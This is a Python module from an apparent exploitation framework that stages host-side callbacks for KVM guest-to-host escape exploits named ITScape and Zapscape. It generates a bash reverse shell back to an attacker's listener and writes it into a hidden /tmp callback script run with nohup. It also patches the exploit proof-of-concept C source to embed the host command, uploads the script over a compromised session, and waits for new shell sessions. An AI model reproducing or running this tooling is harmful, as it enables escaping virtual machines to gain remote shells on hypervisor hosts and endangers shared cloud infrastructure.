"""Host-side callback staging and PoC patching for KVM guest-to-host escape modules."""

from __future__ import annotations

import importlib
import os
import re
import time
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from lib.post.linux.session import LinuxSessionMixin

PAYLOAD_MARKER = "marker"
PAYLOAD_REVERSE_SHELL = "reverse_shell"

ITSCAPE_CALLBACK = "/tmp/.k46316/cb"
ZAPSCAPE_CALLBACK = "/tmp/.k64561/cb"


def payload_mode(raw) -> str:
    choice = str(raw or PAYLOAD_REVERSE_SHELL).strip().lower()
    if choice in ("marker", "file", "touch", "0", "false", "no"):
        return PAYLOAD_MARKER
    return PAYLOAD_REVERSE_SHELL


def callback_lhost(module, opt_value: str = "") -> str:
    explicit = str(opt_value or "").strip()
    if explicit:
        return explicit
    lhost = getattr(module, "lhost", None)
    if lhost is None:
        return ""
    return str(lhost.value if hasattr(lhost, "value") else lhost).strip()


def callback_lport(module) -> int:
    lport = getattr(module, "lport", None)
    if lport is None:
        return 4444
    return int(lport.value if hasattr(lport, "value") else lport)


def generate_reverse_oneliner(lhost: str, lport: int) -> str:
    mod = importlib.import_module("modules.payloads.singles.cmd.unix.bash_reverse_tcp")
    pl = mod.Module()
    pl.set_option("lhost", lhost)
    pl.set_option("lport", str(lport))
    pl.set_option("shell_binary", "sh")
    out = pl.generate()
    if not out or not isinstance(out, str):
        raise RuntimeError("bash_reverse_tcp payload did not return a command string")
    return out.strip()


def callback_script_body(lhost: str, lport: int, marker_path: str) -> str:
    inner = generate_reverse_oneliner(lhost, lport)
    safe = inner.replace("'", "'\\''")
    return (
        "#!/bin/sh\n"
        "umask 022\n"
        f": > {marker_path}\n"
        f"nohup sh -c '{safe}' >/dev/null 2>&1 &\n"
    )


def itscape_host_command(callback_path: str = ITSCAPE_CALLBACK) -> str:
    cmd = f"/bin/sh {callback_path}"
    if len(cmd.encode()) >= 24:
        raise ValueError(f"ITScape host command too long ({len(cmd)} bytes): {cmd!r}")
    return cmd


def zapscape_umh_script(callback_path: str = ZAPSCAPE_CALLBACK) -> str:
    return f"sh {callback_path}"


def encode_poweroff_cmd(host_cmd: str) -> tuple[int, int, int]:
    raw = host_cmd.encode("ascii")
    if len(raw) >= 24:
        raise ValueError(f"poweroff_cmd too long ({len(raw)} bytes, max 23): {host_cmd!r}")
    padded = raw + b"\x00"
    padded = padded.ljust(24, b"\x00")
    return tuple(int.from_bytes(padded[i : i + 8], "little") for i in range(0, 24, 8))


def _u64(v: int) -> str:
    return f"0x{v:016x}ULL"


def patch_itscape_source(source: str, host_cmd: str) -> str:
    w0, w1, w2 = encode_poweroff_cmd(host_cmd)
    replacements = (
        (r"(\{ POWEROFF_CMD \+ 0x00, )0x[0-9a-f]+ULL( \}, /\*.*?\*/)", w0, 1),
        (r"(\{ POWEROFF_CMD \+ 0x08, )0x[0-9a-f]+ULL( \}, /\*.*?\*/)", w1, 1),
        (r"(\{ POWEROFF_CMD \+ 0x10, )0x[0-9a-f]+ULL( \}, /\*.*?\*/)", w2, 1),
        (r"(scw\[0\]\.w = )0x[0-9a-f]+ULL(; /\*.*?\*/)", w0, 1),
        (r"(scw\[1\]\.w = )0x[0-9a-f]+ULL(; /\*.*?\*/)", w1, 1),
        (r"(scw\[2\]\.w = )0x[0-9a-f]+ULL(; /\*.*?\*/)", w2, 1),
    )
    for pattern, word, count in replacements:
        source = re.sub(
            pattern,
            lambda m, w=word: f"{m.group(1)}{_u64(w)}{m.group(2)}",
            source,
            count=count,
        )
    return source


def patch_zapscape_source(source: str, umh_script: str) -> str:
    if len(umh_script) >= 192:
        raise ValueError(f"Zapscape UMH script too long: {umh_script!r}")
    return re.sub(
        r'#define KHP_SCRIPT_TEXT "[^"]*"',
        f'#define KHP_SCRIPT_TEXT "{umh_script}"',
        source,
        count=1,
    )


def snapshot_session_ids(framework) -> set[str]:
    if not framework or not hasattr(framework, "session_manager"):
        return set()
    mgr = framework.session_manager
    if hasattr(mgr, "active_sessions"):
        return set(mgr.active_sessions.keys())
    if hasattr(mgr, "sessions"):
        return set(mgr.sessions.keys())
    listed = mgr.list_sessions() if hasattr(mgr, "list_sessions") else []
    if isinstance(listed, dict):
        return set(listed.keys())
    ids: set[str] = set()
    for item in listed or []:
        if isinstance(item, dict) and item.get("id"):
            ids.add(str(item["id"]))
    return ids


def wait_for_new_sessions(framework, before: set[str], wait_seconds: int) -> list[str]:
    deadline = time.time() + max(1, wait_seconds)
    while time.time() < deadline:
        current = snapshot_session_ids(framework)
        fresh = sorted(current - before)
        if fresh:
            return fresh
        time.sleep(0.5)
    return []


def stage_callback_script(session: LinuxSessionMixin, script_path: str, body: str) -> bool:
    qdir = session.linux_shell_quote(os.path.dirname(script_path) or ".")
    session.linux_execute(f"mkdir -p {qdir}", pty=False)
    if not session.linux_upload_bytes(body.encode("utf-8"), script_path, executable=True, pty=False):
        return False
    qpath = session.linux_shell_quote(script_path)
    session.linux_execute(f"chmod 755 {qpath}", pty=False)
    return session.linux_file_exists(script_path)
